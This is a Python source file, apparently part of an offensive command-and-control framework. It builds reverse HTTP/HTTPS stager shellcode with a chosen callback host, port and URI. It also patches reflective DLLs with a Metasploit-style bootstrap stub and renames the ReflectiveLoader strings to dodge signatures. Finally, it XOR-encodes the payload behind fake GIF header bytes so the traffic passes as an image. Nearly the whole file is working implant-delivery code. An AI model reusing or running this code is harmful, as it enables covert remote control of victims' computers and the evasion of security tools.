import os
import struct
import pefile

x86_http = "stagers/mytest_reverse_http.bin"
x86_https = "stagers/mytest_reverse_https.bin"
x64_https = "stagers/x64_mytest_reverse_https.bin"
x64_http = "stagers/x64_mytest_reverse_http.bin"
REPLACEpath = "/123456789101112131415161718"

gifpadding = b"GIF89a\xc8\x01s\x00\xf7\x00\x00\x08\x08\x08\x04\x04\x04\x02\x02\x02\xfe\xfe\xfe\xa4\xa4\xa4\xf6\xf6\xf8\xfa"

class bcolors:
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    GREEN = '\033[32m'
    ENDC = '\033[0m'

class stagers:
    def __init__(self, helpers):
        self.helpers = helpers

    def generate_shellcode(self, ssl=True, x64=True, port=None, uripath = None, hostname=None):
        if port is None or uripath is None or hostname is None:
            raise RuntimeError("Need to provide a correct arguments to generate_shellcode")
        if len(uripath) > len(REPLACEpath):
            raise RuntimeError("uripath too long")
        if isinstance(port, str):
            port = int(port)
        payloadfile = ""
        if not x64 and not ssl:
            payloadfile = os.path.join(self.helpers.getpayloaddir(), x86_http)
            print('using x86 http regular')
        elif not x64 and ssl:
            payloadfile = os.path.join(self.helpers.getpayloaddir(), x86_https)
            print('using x86 https')
        elif x64 and ssl:
            payloadfile = os.path.join(self.helpers.getpayloaddir(), x64_https)
        elif x64 and not ssl:
            payloadfile = os.path.join(self.helpers.getpayloaddir(), x64_http)
        fin = open(payloadfile, "rb")
        shellcode = fin.read()
        fin.close()
        results = struct.pack("<h", 4444)
        replaceport = struct.pack("<h", port)
        shellcode = shellcode.replace(results, replaceport)
        shellcode = shellcode.replace(REPLACEpath.encode('utf-8'), (uripath + (
                "\x00" * (len(REPLACEpath) - len(uripath)))).encode('utf-8'))
        shellcode = shellcode + hostname.encode('utf-8') + "\x00".encode('utf-8')
        return shellcode

    def prepare_stager(self, stagerbytes, type):
        paddingValues = self.helpers.binary.get_random_bytes(len(gifpadding), filetype=type)
        return paddingValues + b"".join([struct.pack("<B", (x ^ 0x51)) for x in stagerbytes])

    def generate_patched_dll(self, filepath, method='thread', arch="x86", refloadername="Startup", type="gif"):
        exit_method = {'thread': b'\xE0\x1D\x2A\x0A', 'seh': b'\xFE\x0E\x32\xEA', 'process': b'\xF0\xB5\xA2\x56'}
        exit_addr = exit_method["thread"]

        if method not in exit_method:
            print(bcolors.FAIL + "[!] Not valid exit method" + bcolors.ENDC)
            return
        else:
            exit_addr = exit_method[method]

        dll = filepath

        try:
            pe = pefile.PE(dll)
            print(bcolors.GREEN + "[*] %s loaded" % dll + bcolors.ENDC)
        except IOError as e:
            print(str(e))

        offset_file = get_file_offset(pe, arch=arch)
        stub = ""
        if arch == "x64":
            stub = patch_stub_x64(offset_file, exit_addr)
        else:
            stub = patch_stub(offset_file, exit_addr)
            print('using x86 stub')

        src = open(dll, 'rb')
        payload = src.read()

        # Relfective = Size payload + stub + (payload - stub)
        # reflective_payload = struct.pack("<I",len(payload))  + stub + payload[len(stub):]
        reflective_payload = stub + payload[len(stub):]
        # print bcolors.GREEN + "[*] Size (4 bytes) prefixed at the beginning of the payload. Cut it off if you are using a HTTP stager!" + bcolors.ENDC
        print(bcolors.GREEN + "[*] No bytes added for size, meant for http/https/shellcode" + bcolors.ENDC)

        print("Replacing the ReflectiveLoader.c and ReflectiveLoader function")
        paddingstr1 = "%s.c" % (refloadername) + ("\x00" * (len("ReflectiveLoader.c") - len("%s.c" % (refloadername))))
        paddingstr2 = refloadername + ("\x00" * (len("ReflectiveLoader") - len(refloadername)))
        reflective_payload2 = reflective_payload.replace(b"ReflectiveLoader.c", paddingstr1.encode("utf-8")).replace(
            b"ReflectiveLoader", paddingstr2.encode("utf-8"))
        if type is not None:
            return self.prepare_stager(reflective_payload2, type)
        else:
            return reflective_payload2

def patch_binary_values(binary):
    fin = open(binary, 'rb')
    binaryData = fin.read()
    fin.close()
    outdata = binaryData
    return outdata


def get_file_offset(pe, arch="x86"):
    rva = ''
    if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
        for export in pe.DIRECTORY_ENTRY_EXPORT.symbols:
            if b"ReflectiveLoader" in export.name:
                rva = export.address
                print(bcolors.GREEN + "[*] %s export Found! Ord:%s EntryPoint offset: %xh" % (
                    export.name, export.ordinal, rva) + bcolors.ENDC)
                break

    if not rva:
        print(bcolors.FAIL + "[!] Reflective export function not found :/" + bcolors.ENDC)
        return

    offset_va = rva - pe.get_section_by_rva(rva).VirtualAddress
    offset_file = offset_va + pe.get_section_by_rva(rva).PointerToRawData

    # Correct 7 bytes
    if arch == "x64":
        offset_file -= 0x11
    elif arch == "x86":
        offset_file -= 7
    # Return little endian version
    return struct.pack("<I", offset_file)


def patch_stub(offset_file, exit_addr):
    stub = (b"\x4D"  # dec ebp             ; M
            b"\x5A"  # pop edx             ; Z
            b"\xE8\x00\x00\x00\x00"  # call 0              ; call nexmsn ls t instruction
            b"\x5B"  # pop ebx             ; get our location (+7)
            b"\x52"  # push edx            ; push edx back
            b"\x45"  # inc ebp             ; restore ebp
            b"\x55"  # push ebp            ; save ebp
            b"\x89\xE5"  # mov ebp, esp        ; setup fresh stack frame
            b"\x81\xC3" + offset_file +  # add ebx, 0x???????? ; add offset to ReflectiveLoader
            b"\xFF\xD3"  # call ebx            ; call ReflectiveLoader
            b"\x89\xC3"  # mov ebx, eax        ; save DllMain for second call
            b"\x57"  # push edi            ; our socket
            b"\x68\x04\x00\x00\x00"  # push 0x4            ; signal we have attached
            b"\x50"  # push eax            ; some value for hinstance
            b"\xFF\xD0"  # call eax            ; call DllMain( somevalue, DLL_METASPLOIT_ATTACH, socket )
            b"\x68" + exit_addr +  # push 0x????????     ; our EXITFUNC placeholder
            b"\x68\x05\x00\x00\x00"  # push 0x5            ; signal we have detached
            b"\x50"  # push eax            ; some value for hinstance
            b"\xFF\xD3")  # call ebx            ; call DllMain( somevalue, DLL_METASPLOIT_DETACH, exitfunk )
    return stub


# Work in progress
def patch_stub_x64(offset_file, exit_addr):
    # Orig Size 45 bytes
    stub = (b"\x4D\x5A"  # pop r10
            b"\x41\x52"  # push r10
            b"\x55"  # push rbp
            b"\x48\x89\xE5"  # mov rbp, rsp
            b"\x48\x83\xEC\x20"  # sub rsp, 0x20
            b"\xE8\x00\x00\x00\x00"  # call +5
            b"\x5B"  # pop rbx
            b"\x48\x81\xC3" + offset_file +  # add rbx, 0x11223344 #rdi_offset - 0x11
            b"\xFF\xD3"  # call rbx   #ReflectiveLoader Offset.
            b"\x41\xB8\x88\x77\x66\x55"  # mov r8d, 0x55667788
            b"\x6A\x05"  # push 0x5  # DllMain argument flag.
            b"\x5A"  # pop rdx
            b"\xFF\xD3")  # call rbx
    return stub





